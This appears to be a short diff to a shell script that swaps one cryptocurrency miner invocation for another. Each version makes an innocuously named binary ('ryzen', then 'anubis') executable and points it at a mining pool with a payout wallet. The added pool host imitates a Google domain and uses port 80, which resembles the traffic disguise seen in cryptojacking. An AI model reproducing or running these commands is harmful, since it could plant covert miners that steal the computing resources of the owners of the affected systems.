@@ -1,2 +1,2 @@
-chmod 700 ryzen
-./ryzen -a YespowerYtn -o stratum+tcp://45.66.249.224:443 -u TXEKBfQbvYHEE2VLTT7yoS3ZMXi6Rra9g4 -p c=TRX
+chmod 700 anubis
+./anubis -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj -o wss://google.cc.esbandung.store:80
